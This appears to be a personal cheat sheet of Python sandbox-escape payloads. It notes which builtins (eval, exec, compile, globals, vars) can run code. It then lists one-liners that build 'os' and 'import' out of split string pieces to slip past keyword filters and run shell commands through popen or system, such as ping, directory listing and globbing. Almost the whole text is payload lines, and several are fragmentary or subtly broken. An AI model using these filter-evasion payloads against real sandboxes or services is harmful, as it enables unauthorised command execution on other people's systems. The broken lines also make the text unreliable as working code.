start file
check if pid is running

breakpoint()	- basically an endless loop
compile()	- like eval and exec allows you to compile code
globals()	- shows a list of modules

you can execute code for example by doing:


dir()		- shows list of modules in current scope
delattr()
eval()		- allows you to run code
exec()		- allows you to run code
getattr()

allows you to execute code
print(globals()["o" + "s"].popen("ping google.com").read())
print(locals()["o" + "s"].popen("ping google.com").read())
print(vars()["o" + "s"].popen("ping google.com").read())

print(globals()["__builtins__"].eval("o" + "s.popen('ping google.com')").read())
print(locals()["__builtins__"].eval("o" + "s.popen('ping google.com')").read())
print(vars()["__builtins__"].eval("o" + "s.popen('ping google.com')").read())

compile("import o" + "s as p;p.pop"+"en('ping google.com"+"').read()", "", "single")

popen is not allowed but you could still use system

-execute
repr;print(p.glob('*.txt'))")[1:-1]

repr("im" + "po" + "rt o" + "s as p;")
repr("im" + "po" + "rt o" + "s as p;print(p.listdir())")[1:-1]

-execute
repr("im" + "po" + "rt o" + "s as p;print(p.listd"+"ir())")[1:-1]
repr("im" + "po" + "rt o" + "a as p;print(p.system('ping google.com'))")[1:-1]


-execute
repr("im" + "po" + "rt o" + "s as p;")[1:-1]
repr("print(p.listd"+"ir())")[1:-1]

-execute
print(vars()["o" + "s"].system("ping google.com").read())